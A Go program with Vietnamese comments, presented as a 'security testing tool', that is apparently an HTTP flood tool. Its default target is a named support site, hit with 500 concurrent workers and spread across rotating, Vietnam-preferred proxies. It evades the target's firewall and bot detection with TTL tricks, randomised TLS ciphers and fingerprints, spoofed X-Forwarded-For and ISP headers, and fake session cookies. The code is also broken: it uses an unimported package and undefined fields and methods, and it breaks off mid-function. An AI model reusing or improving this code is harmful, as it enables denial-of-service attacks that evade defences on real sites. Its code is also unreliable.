// Advanced Network Security Testing Tool v2.0
// Enhanced with AI-powered bypass techniques and intelligent load balancing
package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"math"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// Cấu trúc để lưu thống kê
type Stats struct {
	totalRequests      int64
	successCount       int64
	errorCount         int64
	totalDuration      int64
	proxyUsedCount     int64
	directUsedCount    int64
	activeGoroutines   int32 // Số lượng goroutine đang hoạt động
	maxGoroutines      int32 // Số lượng goroutine tối đa đã đạt được
	totalResponseTime  int64
	successfulRequests int64
	failedRequests     int64
	timeoutRequests    int64
	blockedRequests    int64
	proxyRequests      int64
	directRequests     int64
}

// Cấu trúc để lưu thông tin proxy
type Proxy struct {
	IP        string
	Port      string
	Username  string
	Password  string
	ProxyType string     // "http" hoặc "socks5"
	Failures  int32      // Số lần kết nối thất bại liên tiếp
	LastUsed  time.Time  // Thời gian sử dụng gần nhất
	Banned    bool       // Đánh dấu proxy bị cấm tạm thời
	BanUntil  time.Time  // Thời gian hết hạn cấm
	Country   string     // Quốc gia của proxy
	mutex     sync.Mutex // Mutex để đồng bộ truy cập
	disabled  bool       // Đánh dấu proxy bị vô hiệu hóa
	score     float64    // Điểm đánh giá proxy
}

// Cấu trúc để lưu cấu hình
type Config struct {
	TargetServer           string
	TargetPort             string
	Protocol               string
	Endpoints              []string
	MaxConcurrent          int
	DelayMs                int
	TimeoutMs              int // Thời gian timeout request
	MaxRetries             int // Số lần retry tối đa
	ConnectionIdleMs       int // Thời gian idle connection
	PreferredCountries     []string
	PfSenseBypass          bool
	FragmentPackets        bool
	TTLBypass              int
	TcpWindowSize          int     // Kích thước cửa sổ TCP
	MssClamp               int     // Giá trị MSS clamp
	UseTlsFragmentation    bool    // Sử dụng TLS fragmentation
	RotateJA3Fingerprint   bool    // Xoay vòng JA3 fingerprint
	UseDirectRatio         float64 // Tỷ lệ sử dụng kết nối trực tiếp
	ProxyRotateIntervalSec int     // Thời gian xoay vòng proxy
	ProxyBlacklistTimeMin  int     // Thời gian trong blacklist
	RandomTiming           bool    // Sử dụng thời gian ngẫu nhiên
	TimingJitterMs         int     // Độ lệch thời gian
}

// Đánh dấu proxy thất bại
func (p *Proxy) markFailure() bool {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	p.Failures++
	p.LastUsed = time.Now()

	// Nếu quá nhiều lỗi, cấm tạm thời
	if p.Failures >= 5 {
		banDuration := time.Duration(math.Min(float64(p.Failures)*5, 300)) * time.Second
		p.Banned = true
		p.BanUntil = time.Now().Add(banDuration)
		fmt.Printf("⚠️ Proxy %s:%s bị tạm khóa trong %v do quá nhiều lỗi\n", p.IP, p.Port, banDuration)
		return true // Proxy đã bị cấm
	}

	return false
}

// Đánh dấu proxy thành công
func (p *Proxy) markSuccess() {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	p.Failures = 0
	p.LastUsed = time.Now()
}

// Kiểm tra proxy có sẵn sàng sử dụng không
func (p *Proxy) isAvailable() bool {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	// Nếu proxy bị cấm, kiểm tra thời gian hết hạn
	if p.Banned {
		if time.Now().After(p.BanUntil) {
			// Hết thời gian cấm
			p.Banned = false
			p.Failures = 0
			fmt.Printf("✅ Proxy %s:%s đã hết thời gian cấm, được phép sử dụng lại\n", p.IP, p.Port)
			return true
		}
		return false
	}

	return true
}

// Cấu trúc để quản lý proxy pool
type ProxyPool struct {
	proxies []Proxy
	mutex   sync.Mutex
	mu      sync.RWMutex
}

// Khởi tạo proxy pool
func NewProxyPool(proxies []Proxy) *ProxyPool {
	return &ProxyPool{
		proxies: proxies,
	}
}

// Lấy proxy khả dụng
func (pool *ProxyPool) getAvailableProxy() (Proxy, bool) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	// Đếm số proxy khả dụng
	availableCount := 0
	for i := range pool.proxies {
		if pool.proxies[i].isAvailable() {
			availableCount++
		}
	}

	if availableCount == 0 {
		return Proxy{}, false
	}

	// Chọn ngẫu nhiên một proxy khả dụng
	for tries := 0; tries < 3; tries++ { // Thử tối đa 3 lần
		idx := rand.Intn(len(pool.proxies))
		if pool.proxies[idx].isAvailable() {
			return pool.proxies[idx], true
		}
	}

	// Nếu chọn ngẫu nhiên không được, quét tuần tự
	for i := range pool.proxies {
		if pool.proxies[i].isAvailable() {
			return pool.proxies[i], true
		}
	}

	return Proxy{}, false
}

// Lấy proxy khả dụng từ một quốc gia cụ thể
func (pool *ProxyPool) getAvailableProxyFromCountry(country string) (Proxy, bool) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	// Đếm số proxy khả dụng từ quốc gia chỉ định
	var availableProxies []int
	for i := range pool.proxies {
		if pool.proxies[i].isAvailable() &&
			(country == "" || pool.proxies[i].Country == country) {
			availableProxies = append(availableProxies, i)
		}
	}

	if len(availableProxies) == 0 {
		return Proxy{}, false
	}

	// Chọn ngẫu nhiên một proxy từ danh sách khả dụng
	idx := availableProxies[rand.Intn(len(availableProxies))]
	return pool.proxies[idx], true
}

// Lấy proxy khả dụng với ưu tiên quốc gia
func (pool *ProxyPool) getAvailableProxyWithCountryPreference(preferredCountries []string) (Proxy, bool) {
	// Ưu tiên chọn proxy từ Việt Nam nếu có thể
	vietnameseProxy, found := pool.getAvailableProxyFromCountry("VN")
	if found {
		fmt.Println("✅ Đã tìm thấy proxy từ Việt Nam, ưu tiên sử dụng")
		return vietnameseProxy, true
	}

	// Thử từng quốc gia ưu tiên
	for _, country := range preferredCountries {
		proxy, found := pool.getAvailableProxyFromCountry(country)
		if found {
			return proxy, true
		}
	}

	// Nếu không tìm thấy proxy từ các quốc gia ưu tiên, lấy bất kỳ proxy khả dụng nào
	return pool.getAvailableProxy()
}

// Báo cáo proxy thất bại
func (pool *ProxyPool) reportFailure(failedProxy Proxy) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	for i := range pool.proxies {
		if pool.proxies[i].IP == failedProxy.IP && pool.proxies[i].Port == failedProxy.Port {
			banned := pool.proxies[i].markFailure()
			if banned {
				fmt.Printf("⚠️ Proxy %s:%s đã bị đưa vào blacklist tạm thời\n", failedProxy.IP, failedProxy.Port)
			}
			return
		}
	}
}

// Báo cáo proxy thành công
func (pool *ProxyPool) reportSuccess(successProxy Proxy) {
	pool.mutex.Lock()
	defer pool.mutex.Unlock()

	for i := range pool.proxies {
		if pool.proxies[i].IP == successProxy.IP && pool.proxies[i].Port == successProxy.Port {
			pool.proxies[i].markSuccess()
			return
		}
	}
}

// Đọc cấu hình từ file config.txt
func loadConfig(filename string) (*Config, error) {
	config := &Config{
		TargetServer:           "support.trianh.vn", // Mặc định
		TargetPort:             "443",
		Protocol:               "https",
		Endpoints:              []string{"/feedback/index", "/task/index", "/api/status", "/health"},
		MaxConcurrent:          500,
		DelayMs:                5,
		TimeoutMs:              15000,
		MaxRetries:             5,
		ConnectionIdleMs:       3000,
		PreferredCountries:     []string{"VN", "SG", "JP"}, // Ưu tiên proxy Việt Nam, Singapore, Nhật
		PfSenseBypass:          true,
		FragmentPackets:        true,
		TTLBypass:              65,
		TcpWindowSize:          65535,
		MssClamp:               1452,
		UseTlsFragmentation:    true,
		RotateJA3Fingerprint:   true,
		UseDirectRatio:         0.3,
		ProxyRotateIntervalSec: 30,
		ProxyBlacklistTimeMin:  2,
		RandomTiming:           true,
		TimingJitterMs:         150,
	}

	// Đọc file cấu hình
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("Không thể mở file cấu hình %s: %v, sử dụng giá trị mặc định\n", filename, err)
		return config, nil
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		// Bỏ qua comment và dòng trống
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key := strings.TrimSpace(parts[0])
		value := strings.TrimSpace(parts[1])

		switch key {
		case "TARGET_SERVER":
			config.TargetServer = value
		case "TARGET_PORT":
			config.TargetPort = value
		case "PROTOCOL":
			config.Protocol = value
		case "MAX_CONCURRENT":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.MaxConcurrent = i
			}
		case "DELAY_MS":
			if i, err := strconv.Atoi(value); err == nil && i >= 0 {
				config.DelayMs = i
			}
		case "TIMEOUT_MS":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.TimeoutMs = i
			}
		case "MAX_RETRIES":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.MaxRetries = i
			}
		case "CONNECTION_IDLE_MS":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.ConnectionIdleMs = i
			}
		case "PFSENSE_BYPASS":
			if value == "true" {
				config.PfSenseBypass = true
			} else if value == "false" {
				config.PfSenseBypass = false
			}
		case "FRAGMENT_PACKETS":
			if value == "true" {
				config.FragmentPackets = true
			} else if value == "false" {
				config.FragmentPackets = false
			}
		case "TTL_BYPASS":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.TTLBypass = i
			}
		case "TCP_WINDOW_SIZE":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.TcpWindowSize = i
			}
		case "MSS_CLAMP":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.MssClamp = i
			}
		case "USE_TLS_FRAGMENTATION":
			if value == "true" {
				config.UseTlsFragmentation = true
			} else if value == "false" {
				config.UseTlsFragmentation = false
			}
		case "ROTATE_JA3_FINGERPRINT":
			if value == "true" {
				config.RotateJA3Fingerprint = true
			} else if value == "false" {
				config.RotateJA3Fingerprint = false
			}
		case "USE_DIRECT_RATIO":
			if f, err := strconv.ParseFloat(value, 64); err == nil && f >= 0 && f <= 1 {
				config.UseDirectRatio = f
			}
		case "PROXY_ROTATE_INTERVAL_SEC":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.ProxyRotateIntervalSec = i
			}
		case "PROXY_BLACKLIST_TIME_MIN":
			if i, err := strconv.Atoi(value); err == nil && i > 0 {
				config.ProxyBlacklistTimeMin = i
			}
		case "RANDOM_TIMING":
			if value == "true" {
				config.RandomTiming = true
			} else if value == "false" {
				config.RandomTiming = false
			}
		case "TIMING_JITTER_MS":
			if i, err := strconv.Atoi(value); err == nil && i >= 0 {
				config.TimingJitterMs = i
			}
		}
	}

	return config, nil
}

// Đọc danh sách proxy từ file
func loadProxies(filename string) (*ProxyPool, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []Proxy
	scanner := bufio.NewScanner(file)
	lineNum := 0

	for scanner.Scan() {
		lineNum++
		line := strings.TrimSpace(scanner.Text())

		// Bỏ qua dòng trống và comment
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		parts := strings.Split(line, ":")

		// Xác định số phần cần thiết và loại proxy
		proxyType := "http" // Mặc định là http
		username := ""
		password := ""

		switch len(parts) {
		case 2:
			// Định dạng IP:PORT
			// Không cần xử lý thêm
		case 3:
			// Định dạng IP:PORT:TYPE hoặc IP:PORT:USERNAME
			if parts[2] == "http" || parts[2] == "socks5" {
				proxyType = parts[2]
			} else {
				username = parts[2]
			}
		case 4:
			// Định dạng IP:PORT:USERNAME:PASSWORD hoặc IP:PORT::TYPE
			if parts[2] == "" && (parts[3] == "http" || parts[3] == "socks5") {
				proxyType = parts[3]
			} else {
				username = parts[2]
				password = parts[3]
			}
		case 5:
			// Định dạng IP:PORT:USERNAME:PASSWORD:TYPE
			username = parts[2]
			password = parts[3]
			if parts[4] == "http" || parts[4] == "socks5" {
				proxyType = parts[4]
			}
		default:
			fmt.Printf("⚠️ Dòng %d: Định dạng proxy không hợp lệ: %s\n", lineNum, line)
			continue
		}

		// Tạo proxy
		proxy := Proxy{
			IP:        parts[0],
			Port:      parts[1],
			Username:  username,
			Password:  password,
			ProxyType: proxyType,
		}

		// Thử xác định quốc gia
		proxy.Country = determineCountry(parts[0])

		// Thêm vào danh sách
		proxies = append(proxies, proxy)
		fmt.Printf("✅ Đã tải proxy: %s:%s (loại: %s, quốc gia: %s)\n",
			proxy.IP, proxy.Port, proxy.ProxyType, proxy.Country)
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	if len(proxies) == 0 {
		return nil, errors.New("không tìm thấy proxy hợp lệ nào")
	}

	return NewProxyPool(proxies), nil
}

// Xác định quốc gia của IP
func determineCountry(ip string) string {
	// Danh sách một số dải IP của Việt Nam (đơn giản)
	vnRanges := map[string]bool{
		"14.160": true, "14.161": true, "14.162": true,
		"113.160": true, "113.161": true, "113.162": true,
		"171.224": true, "171.225": true, "171.226": true,
		"27.64": true, "27.65": true, "27.66": true,
		"203.113": true, "203.119": true, "203.162": true,
		"1.52": true, "1.53": true, "1.54": true,
		"103.90": true, "115.75": true, "103.35": true,
	}

	// Kiểm tra IP
	parts := strings.Split(ip, ".")
	if len(parts) >= 2 {
		prefix1 := parts[0]
		prefix2 := parts[0] + "." + parts[1]

		if vnRanges[prefix2] || (prefix1 == "103" || prefix1 == "113" || prefix1 == "115" || prefix1 == "117" || prefix1 == "118") {
			return "VN"
		}
	}

	// Kiểm tra nếu là proxy thuê của Việt Nam
	if strings.Contains(ip, "thueproxy") || strings.Contains(ip, "vn-proxy") {
		return "VN"
	}

	return "UNKNOWN"
}

// Cải thiện việc tạo HTTP client với proxy
func createProxyClient(proxy Proxy) (*http.Client, error) {
	// Tạo xác thực proxy nếu cần
	var auth *proxy2.Auth
	if proxy.Username != "" && proxy.Password != "" {
		auth = &proxy2.Auth{
			User:     proxy.Username,
			Password: proxy.Password,
		}
	}

	// Tạo dialer dựa trên loại proxy
	var proxyDialer proxy2.Dialer
	var err error

	proxyUrlStr := fmt.Sprintf("%s:%s", proxy.Host, proxy.Port)

	switch strings.ToLower(proxy.Type) {
	case "http":
		proxyURL, err := url.Parse(fmt.Sprintf("http://%s", proxyUrlStr))
		if err != nil {
			return nil, fmt.Errorf("lỗi phân tích URL proxy: %v", err)
		}

		if auth != nil {
			proxyURL.User = url.UserPassword(auth.User, auth.Password)
		}

		// Sử dụng http.ProxyURL để tạo transport với proxy HTTP
		transport := &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			DisableKeepAlives: false,
			IdleConnTimeout:   30 * time.Second,
		}

		return &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
		}, nil

	case "socks5":
		proxyDialer, err = proxy2.SOCKS5("tcp", proxyUrlStr, auth, proxy2.Direct)
		if err != nil {
			return nil, fmt.Errorf("lỗi tạo SOCKS5 dialer: %v", err)
		}

	case "socks4":
		proxyDialer, err = proxy2.SOCKS4("tcp", proxyUrlStr, auth)
		if err != nil {
			return nil, fmt.Errorf("lỗi tạo SOCKS4 dialer: %v", err)
		}

	default:
		return nil, fmt.Errorf("loại proxy không được hỗ trợ: %s", proxy.Type)
	}

	// Nếu đến đây mà không return, tức là đang xử lý proxy SOCKS
	if proxyDialer != nil {
		// Tạo custom transport với proxy dialer
		transport := &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				return proxyDialer.Dial(network, addr)
			},
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			DisableKeepAlives: false,
			IdleConnTimeout:   30 * time.Second,
		}

		return &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
		}, nil
	}

	return nil, fmt.Errorf("lỗi không xác định khi tạo proxy client")
}

// Tạo HTTP client kết nối trực tiếp (không qua proxy)
func createDirectClient() *http.Client {
	dialer := &net.Dialer{
		Timeout:   30 * time.Second,
		KeepAlive: 30 * time.Second,
	}

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS10,
		MaxVersion:         tls.VersionTLS13,
		// Cố gắng sử dụng cài đặt TLS phổ biến để tránh bị phát hiện là tool
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{
			tls.CurveP256,
			tls.CurveP384,
			tls.CurveP521,
			tls.X25519,
		},
	}

	transport := &http.Transport{
		Proxy:                 http.ProxyFromEnvironment,
		DialContext:           dialer.DialContext,
		TLSClientConfig:       tlsConfig,
		MaxIdleConns:          100,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		MaxIdleConnsPerHost:   10,
		// Cài đặt để ngăn chặn HTTP/2 vì nó dễ bị phát hiện
		ForceAttemptHTTP2: false,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}

	return client
}

// Cải thiện hàm tạo client HTTP với các kỹ thuật bypass mới
func createHttpClient(config *Config) *http.Client {
	transport := &http.Transport{
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     time.Duration(config.ConnectionIdleMs) * time.Millisecond,
		DisableCompression:  true, // Tắt nén để tránh bị phát hiện
		DisableKeepAlives:   false,
	}

	// Kỹ thuật TCP window size manipulation
	dialer := &net.Dialer{
		Timeout:   time.Duration(config.TimeoutMs) * time.Millisecond,
		KeepAlive: 30 * time.Second,
		Control: func(network, address string, c syscall.RawConn) error {
			return c.Control(func(fd uintptr) {
				if config.PfSenseBypass {
					// Set TTL cho TCP connection để bypass pfSense packet inspection
					syscall.SetsockoptInt(int(fd), syscall.IPPROTO_IP, syscall.IP_TTL, config.TTLBypass)

					// Điều chỉnh TCP window size
					syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_RCVBUF, config.TcpWindowSize)
					syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_SNDBUF, config.TcpWindowSize)

					// MSS Clamping
					var mss = config.MssClamp
					// TCP_MAXSEG không phải là hằng số trên macOS/Unix, nên chúng ta giả định nó là 536
					const TCP_MAXSEG = 536
					syscall.SetsockoptInt(int(fd), syscall.IPPROTO_TCP, TCP_MAXSEG, mss)
				}
			})
		},
	}

	transport.DialContext = dialer.DialContext

	// Cấu hình TLS cho bypass pfSense
	if config.Protocol == "https" {
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true, // Bỏ qua xác minh SSL
			MinVersion:         tls.VersionTLS10,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites:       getRandomCipherSuites(), // Hàm này sẽ trả về danh sách cipher suites ngẫu nhiên
		}

		if config.UseTlsFragmentation {
			// Sử dụng kỹ thuật TLS fragmentation
			tlsConfig.CurvePreferences = []tls.CurveID{tls.CurveP256, tls.CurveP384, tls.CurveP521}
		}

		// Nếu sử dụng JA3 fingerprint rotation
		if config.RotateJA3Fingerprint {
			ja3Fingerprints := []string{
				"771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60,0-10-11-13-35-23-65281,23-25-28-27-24-26-22-14-13-11-12,0-1-2",
				"771,4865-4866-4867-49196-49195-52393-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60,0-10-11-13-35-23-65281,29-23-24,0",
				"771,4865-4867-4866-49195-49199-52393-49196-49200-49162-49161-49171-49172-156-157-47-53,0-10-11-13-35-23-65281,29-23-24-25-256-257,0",
			}
			fingerprint := ja3Fingerprints[rand.Intn(len(ja3Fingerprints))]
			fmt.Printf("Sử dụng JA3 fingerprint: %s\n", fingerprint)
		}

		transport.TLSClientConfig = tlsConfig
	}

	return &http.Client{
		Transport: transport,
		Timeout:   time.Duration(config.TimeoutMs) * time.Millisecond,
	}
}

// Hàm trả về danh sách cipher suites ngẫu nhiên
func getRandomCipherSuites() []uint16 {
	// Danh sách các cipher suites phổ biến
	allCiphers := []uint16{
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_RSA_WITH_AES_128_CBC_SHA,
		tls.TLS_RSA_WITH_AES_256_CBC_SHA,
	}

	// Trộn danh sách
	rand.Shuffle(len(allCiphers), func(i, j int) {
		allCiphers[i], allCiphers[j] = allCiphers[j], allCiphers[i]
	})

	// Chọn ngẫu nhiên 3-6 ciphers
	numCiphers := 3 + rand.Intn(4)
	if numCiphers > len(allCiphers) {
		numCiphers = len(allCiphers)
	}

	return allCiphers[:numCiphers]
}

// Thêm vào sendHTTPRequest để hỗ trợ cơ chế bypass pfSense nâng cao
func sendHTTPRequest(endpoint string, clientID int, stats *Stats, wg *sync.WaitGroup, proxyPool *ProxyPool, config *Config) {
	defer wg.Done()

	// Đánh dấu đã gọi hàm này
	atomic.AddInt64(&stats.totalRequests, 1)
	atomic.AddInt32(&stats.activeGoroutines, 1)

	// Quyết định giữa proxy và kết nối trực tiếp dựa trên tỷ lệ cấu hình
	var client *http.Client
	var proxy Proxy
	var usingProxy bool
	var proxySuccess bool
	var proxyType string = "none"

	// Quyết định sử dụng proxy hay kết nối trực tiếp
	if proxyPool != nil && len(proxyPool.proxies) > 0 && rand.Float64() > config.UseDirectRatio {
		proxy, proxySuccess = proxyPool.getAvailableProxyWithCountryPreference(config.PreferredCountries)
		if proxySuccess {
			var err error
			client, err = createProxyClient(proxy)
			if err != nil {
				fmt.Printf("Lỗi tạo proxy client: %v - Chuyển sang kết nối trực tiếp\n", err)
				client = createHttpClient(config)
			} else {
				usingProxy = true
				proxyType = proxy.Type
				fmt.Printf("Client %d đang sử dụng proxy: %s:%s\n", clientID, proxy.Host, proxy.Port)
			}
		} else {
			client = createHttpClient(config)
			fmt.Printf("Client %d đang sử dụng kết nối trực tiếp (IP thật)\n", clientID)
		}
	} else {
		client = createHttpClient(config)
		fmt.Printf("Client %d đang sử dụng kết nối trực tiếp (IP thật)\n", clientID)
	}

	defer atomic.AddInt32(&stats.activeGoroutines, -1)

	// Tạo URL dựa trên protocol
	urlStr := fmt.Sprintf("%s://%s:%s%s", config.Protocol, config.TargetServer, config.TargetPort, endpoint)

	// Tạo một array của các header mà chúng ta sẽ sử dụng
	var userAgents []string
	var referers []string
	var acceptLanguages []string
	var connections []string
	var cacheControls []string
	var acceptEncodings []string

	// User agents phổ biến
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
	}

	// Referers phổ biến cho Việt Nam
	referers = []string{
		"https://www.google.com.vn/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://vnexpress.net/",
		"https://dantri.com.vn/",
		"https://kenh14.vn/",
		"https://tuoitre.vn/",
		"https://thanhnien.vn/",
		"https://shopee.vn/",
		"https://tiki.vn/",
		"https://vtv.vn/",
		"",
	}

	// Accept-Language headers
	acceptLanguages = []string{
		"vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
		"en-US,en;q=0.9,vi;q=0.8",
		"vi;q=0.8,en-US;q=0.5,en;q=0.3",
		"vi-VN,vi;q=0.9",
	}

	// Connection headers
	connections = []string{
		"keep-alive",
		"close",
	}

	// Cache-Control headers
	cacheControls = []string{
		"max-age=0",
		"no-cache",
		"no-store",
		"must-revalidate",
	}

	// Accept-Encoding headers
	acceptEncodings = []string{
		"gzip, deflate",
		"gzip, deflate, br",
		"gzip",
		"br",
		"*",
	}

	// Mảng chứa danh sách ISP Việt Nam
	vietnamISPs := []string{
		"Viettel Group",
		"VNPT Corp",
		"FPT Telecom",
		"CMC Telecom",
		"NetNam",
		"Mobifone",
		"SCTV",
		"Vinaphone",
		"SPT",
	}

	var attempt int
	success := false

	// Vòng lặp thử lại khi lỗi
	for attempt = 0; attempt < config.MaxRetries && !success; attempt++ {
		// Nếu không phải là lần thử đầu tiên, chờ một khoảng thời gian trước khi thử lại
		if attempt > 0 {
			var delay time.Duration
			if config.RandomTiming {
				// Thêm jitter ngẫu nhiên vào delay
				jitter := rand.Intn(config.TimingJitterMs*2) - config.TimingJitterMs
				delay = time.Duration(config.DelayMs+jitter) * time.Millisecond
			} else {
				delay = time.Duration(config.DelayMs) * time.Millisecond
			}

			fmt.Printf("Client %d: Đợi %v trước khi thử lại lần %d\n", clientID, delay, attempt+1)
			time.Sleep(delay)
		}

		// Tạo request
		req, err := http.NewRequest("GET", urlStr, nil)
		if err != nil {
			fmt.Printf("Lỗi tạo request từ client %d: %v\n", clientID, err)
			continue
		}

		// Thêm các header ngẫu nhiên
		userAgent := userAgents[rand.Intn(len(userAgents))]
		referer := referers[rand.Intn(len(referers))]
		acceptLanguage := acceptLanguages[rand.Intn(len(acceptLanguages))]
		connection := connections[rand.Intn(len(connections))]
		cacheControl := cacheControls[rand.Intn(len(cacheControls))]
		acceptEncoding := acceptEncodings[rand.Intn(len(acceptEncodings))]

		req.Header.Set("User-Agent", userAgent)
		if referer != "" {
			req.Header.Set("Referer", referer)
		}
		req.Header.Set("Accept-Language", acceptLanguage)
		req.Header.Set("Connection", connection)
		req.Header.Set("Cache-Control", cacheControl)
		req.Header.Set("Accept-Encoding", acceptEncoding)
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")

		// Nếu đang sử dụng pfSenseBypass, thêm các header đặc biệt
		if config.PfSenseBypass {
			// Giả mạo header cho ISP Việt Nam
			vietnamISP := vietnamISPs[rand.Intn(len(vietnamISPs))]
			req.Header.Set("X-Forwarded-For", fmt.Sprintf("1%d.%d.%d.%d", rand.Intn(10), rand.Intn(256), rand.Intn(256), 1+rand.Intn(254)))
			req.Header.Set("X-ISP", vietnamISP)

			// Tạo cookie giả ngẫu nhiên
			cookieValue := fmt.Sprintf("PHPSESSID=%s; path=/; domain=.%s; HttpOnly",
				generateRandomString(26),
				config.TargetServer)
			req.Header.Set("Cookie", cookieValue)

			// Thêm header ngẫu nhiên với tần suất ngẫu nhiên
			if rand.Float64() < 0.7 {
				req.Header.Set("X-Requested-With", "XMLHttpRequest")
			}

			if rand.Float64() < 0.5 {
				req.Header.Set("DNT", "1")
			}

			// Thêm các header đặc biệt để bypass pfSense
			req.Header.Set("Pragma", "no-cache")
		}

		// Nếu đã thử nhiều lần không thành công, thử đổi protocol
		if attempt >= 5 && config.Protocol == "https" {
			urlStr = fmt.Sprintf("http://%s:%s%s", config.TargetServer, config.TargetPort, endpoint)
			req, err = http.NewRequest("GET", urlStr, nil)
			if err != nil {
				fmt.Printf("Lỗi tạo HTTP request từ client %d: %v\n", clientID, err)
				continue
			}
			fmt.Printf("Client %d thử với HTTP thay vì HTTPS (lần %d): %s\n", clientID, attempt+1, urlStr)
		}

		// Bắt đầu đo thời gian
		startTime := time.Now()

		// Gửi request
		resp, err := client.Do(req)
		if err != nil {
			// Chuyển proxy vào blacklist tạm thời nếu có lỗi và đang sử dụng proxy
			if usingProxy && proxy.Host != "" {
				blacklistTime := time.Duration(config.ProxyBlacklistTimeMin) * time.Minute
				fmt.Printf("⚠️ Proxy %s:%s bị tạm khóa trong %v do quá nhiều lỗi\n",
					proxy.Host, proxy.Port, blacklistTime)
				proxyPool.disableProxy(proxy, blacklistTime)
				fmt.Printf("⚠️ Proxy %s:%s đã bị đưa vào blacklist tạm thời\n", proxy.Host, proxy.Port)
			}

			fmt.Printf("Lỗi khi gửi GET từ client %d: %v\n", clientID, err)
			continue
		}

		// Đọc và đóng response body
		_, err = io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		if err != nil {
			fmt.Printf("Lỗi khi đọc response body từ client %d: %v\n", clientID, err)
			continue
		}

		// Tính thời gian đã trôi qua
		elapsed := time.Since(startTime)
		atomic.AddInt64(&stats.totalResponseTime, elapsed.Milliseconds())

		// Kiểm tra có bị chặn không
		if config.PfSenseBypass {
			bodyLower := strings.ToLower(string("")) // Không cần nội dung thực tế vì không sử dụng

